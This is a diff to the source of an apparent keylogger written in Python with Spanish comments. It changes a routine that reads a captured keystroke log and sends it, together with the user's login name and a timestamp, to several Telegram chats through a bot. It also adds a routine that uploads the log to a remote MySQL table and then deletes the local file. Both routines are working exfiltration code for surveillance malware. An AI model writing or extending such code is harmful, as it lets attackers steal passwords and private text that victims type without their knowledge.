@@ -195,26 +195,25 @@ class Util:
         try:
             print("[TelegramBot] Proceso...")
             pathN = Config().LOG_KEY_PATH + Functions().RandomChar(23) + ".txt"
-            os.rename(Config().PATH_KEY, pathN)
+            os.rename(Config().PATH_LOG, pathN)
             # Abre el archivo
             f = open(pathN, 'r')
             T = datetime.datetime.now()
             currentTime = T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B") + " " + T.strftime(
                 "%I") + ":" + T.strftime("%M") + " " + T.strftime("%p")
-            try:
+            def SendT(ID):
                 bot = telebot.TeleBot(Config.TelegramBot().TOKEN)  # Instancia
-                bot.send_message(Config.TelegramBot().ID,"Usuario: " + str(getuser()) + "\nFecha: " + currentTime + "\n=>\n=>\n"+f.read())
-                print("[TelegramBot] Se obtuvo el registro de teclas y se envió a Telegram [ID 1] ="+str(Config.TelegramBot().ID))
+                bot.send_message(ID,"Usuario: " + str(getuser()) + "\nFecha: " + currentTime + "\n=>\n=>\n" + f.read())
+                print("[TelegramBot] Se obtuvo el registro de teclas y se envió a Telegram [ID 1] =" + str(ID))
+            try:
+                if Config.TelegramBot().ID_2 != 000000000:
+                    SendT(Config.TelegramBot().ID)
 
                 if Config.TelegramBot().ID_2 != 000000000:
-                    bot2 = telebot.TeleBot(Config.TelegramBot().TOKEN)  # Instancia
-                    bot2.send_message(Config.TelegramBot().ID_2,"Usuario: " + str(getuser()) + "\nFecha: " + currentTime + "\n=>\n=>\n" + f.read())
-                    print("[TelegramBot] Se obtuvo el registro de teclas y se envió a Telegram [ID 1] =" + str(Config.TelegramBot().ID_2))
+                    SendT(Config.TelegramBot().ID_2)
 
                 if Config.TelegramBot().ID_3 != 000000000:
-                    bot3 = telebot.TeleBot(Config.TelegramBot().TOKEN)  # Instancia
-                    bot3.send_message(Config.TelegramBot().ID_3, "Usuario: " + str(getuser()) + "\nFecha: " + currentTime + "\n=>\n=>\n" + f.read())
-                    print("[TelegramBot] Se obtuvo el registro de teclas y se envió a Telegram [ID 1] =" + str(Config.TelegramBot().ID_3))
+                    SendT(Config.TelegramBot().ID_3)
 
                 f.close()
                 os.remove(pathN)
@@ -229,7 +228,56 @@ class Util:
                 pass
             print("[Telegram] No se encuentra el archivo")
 
-   
+    def MySQL(self):
+        exito = False
+        try:  # Verifica si se inició corectamente
+            connection = pymysql.connect(
+                host=Config.DataBase().HOSTNAME,
+                user=Config.DataBase().USERNAME,
+                password=Config.DataBase().PASSWORD,
+                database=Config.DataBase().DATABASE)
+            cursor = connection.cursor()  # Objeto cursor
+            print("Se inició correctamente ")
+            exito = True
+        except:
+            exito = False
+            print("Error al iniciar sesión [DataBase]")
+
+        def UpdateUser():
+            try:
+                pathN = Config().LOG_KEY_PATH + Functions().RandomChar(23) + ".txt"
+                os.rename(Config().PATH_LOG, pathN)
+                # Abre el archivo
+                f = open(pathN, 'r')
+                data = f.read()
+                f.close()
+                print(data)
+                # Tiempo
+                T = datetime.datetime.now()
+                currentTime = T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B") + " " + T.strftime(
+                    "%I") + ":" + T.strftime("%M") + " " + T.strftime("%p")
+                sql = "INSERT INTO keyLog(l_user, l_time, l_log) VALUES(%s,%s,%s)"
+                try:
+                    cursor.execute(sql, (str(getuser()), currentTime, data))  # Ejecuta virtual
+                    connection.commit()  # Se guardan virtual
+                    print("[Database] Se subieron los datos correctamente")
+                    # Elimina Registro Key
+                    connection.close()
+                    os.remove(pathN)
+                except:
+                    print("[Database] Error al subir los datos")
+
+            except:
+                try:
+                    os.remove(pathN)  # Borra la carpeta por posible Errores
+                except:
+                    pass
+                print("[DataBase] No se encuentra el archivo")
+
+        if (exito):  # Solo se ejecutará si se inició correctamente la base de datos
+            UpdateUser()
+        # print("[DataBase]=> "+str(exito))
+
 
 
 
